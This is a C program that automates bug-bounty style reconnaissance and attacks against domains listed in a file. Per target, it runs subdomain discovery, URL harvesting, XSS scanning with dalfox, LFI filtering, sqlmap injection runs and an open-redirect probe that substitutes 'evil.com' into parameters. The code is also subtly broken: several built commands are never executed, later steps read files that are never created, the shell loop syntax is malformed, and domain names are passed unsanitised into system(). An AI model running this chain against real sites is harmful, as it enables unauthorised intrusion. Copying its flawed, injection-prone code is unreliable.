#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/stat.h>
#include <dirent.h>
#include <errno.h>

#define MAX_TARGETS 50

typedef struct {
    char target[256];
    char hunt_dir[512];
} task_args;

int create_dir(const char *path) {
    if (mkdir(path, 0755) != 0 && errno != EEXIST) {
        perror("mkdir");
        return 0;
    }
    return 1;
}

void run_command(char *cmd) {
    printf("[*] Executing: %s\n", cmd);
    system(cmd);
}

void* recon_worker(void* arg) {
    task_args* task = (task_args*)arg;

    char target_path[1024];
    snprintf(target_path, sizeof(target_path),
             "%s/%s", task->hunt_dir, task->target);

    create_dir(target_path);

    char target_file[1024];
    snprintf(target_file, sizeof(target_file),
             "%s/target.txt", target_path);

    FILE *f = fopen(target_file, "w");
    if (!f) {
        perror("fopen");
        pthread_exit(NULL);
    }

    fprintf(f, "%s\n", task->target);
    fclose(f);

    char cmd[2048];

    // subfinder
    snprintf(cmd, sizeof(cmd),
             "subfinder -dL %s/target.txt -all --recursive -o %s/Subs01.txt",
             target_path, target_path);
    run_command(cmd);
    
    //subenum
    snprintf(cmd, sizeof(cmd), "subenum -l %s/target.txt -u wayback,crt,abuseipdb,bufferover,Findomain,Subfinder,Amass,Assetfinder -o %s/Subs02.txt",
             target_path, target_path);
    // AliveSubs 
    snprintf(cmd, sizeof(cmd), "cat %s/Subs*.txt | anew | tee %s/AllSubs.txt",
             target_path, target_path);
    //AliveSubs httpx
    snprintf(cmd, sizeof(cmd), "cat %s/AllSubs.txt | httpx -o %s/AliveSubs.txt",
             target_path, target_path); 
    
    // httpx
    snprintf(cmd, sizeof(cmd),
             "cat %s/Subs.txt | httpx -o %s/AliveSubs.txt",
             target_path, target_path);
    run_command(cmd);

    // wayback
    snprintf(cmd, sizeof(cmd),
             "cat %s/AliveSubs.txt | waybackurls | tee %s/urls.txt",
             target_path, target_path);
    run_command(cmd);
    //find params
    snprintf(cmd, sizeof(cmd), "cat %s/urls.txt | grep '=' | tee %s/param.txt",
             target_path, target_path);

    // xss
    snprintf(cmd, sizeof(cmd),
             "cat %s/urls.txt | uro | gf xss > %s/xss.txt",
             target_path, target_path);
    run_command(cmd);
    snprintf(cmd, sizeof(cmd), "dalfox file %s/xss.txt  | tee %s/XSSvulnerable.txt",
           target_path, target_path);
    //lfi 
    snprintf(cmd, sizeof(cmd),
            "cat %s/AliveSubs.txt | gau | uro | gf lfi | tee %s/lfi.txt",
            target_path, target_path);
    run_command(cmd);


    // sql injection
    snprintf(cmd, sizeof(cmd),
          "sqlmap -m %s/param.txt --batch --random-agent --level 1 | tee %s/sqlmap.txt",
          target_path, target_path);
    run_command(cmd);
    //open redirect
    snprintf(cmd, sizeof(cmd),
            "cat %s/urls.txt | grep -a -i =http | qsreplace 'evil.com' | while read host do;do curl -s -L $host -I| grep evil.com && echo $host 3[0;31mVulnerable\n ;done",
            target_path);
    run_command(cmd);

    // js files
    snprintf(cmd, sizeof(cmd),
             "cat %s/urls.txt | grep -iE '.js' | grep -ivE '.json' | sort -u > %s/js.txt",
             target_path, target_path);
    run_command(cmd);

    printf("[✓] Finished recon for %s\n", task->target);

    free(task);
    pthread_exit(NULL);
}

int main() {
    const char *home = getenv("HOME");
    if (!home) {
        fprintf(stderr, "HOME not found\n");
        return 1;
    }

    char hunt_dir[512];
    snprintf(hunt_dir, sizeof(hunt_dir), "%s/hunt", home);
    create_dir(hunt_dir);

    FILE *file = fopen("targets.txt", "r");
    if (!file) {
        printf("Create a file called targets.txt with one domain per line.\n");
        return 1;
    }

    pthread_t threads[MAX_TARGETS];
    int count = 0;
    char line[256];

    while (fgets(line, sizeof(line), file) && count < MAX_TARGETS) {
        line[strcspn(line, "\n")] = 0;

        task_args* task = malloc(sizeof(task_args));
        strcpy(task->target, line);
        strcpy(task->hunt_dir, hunt_dir);

        if (pthread_create(&threads[count], NULL, recon_worker, task) != 0) {
            perror("pthread_create");
            free(task);
            continue;
        }

        count++;
    }

    fclose(file);

    for (int i = 0; i < count; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("\nAll recon tasks completed.\n");
    return 0;
}
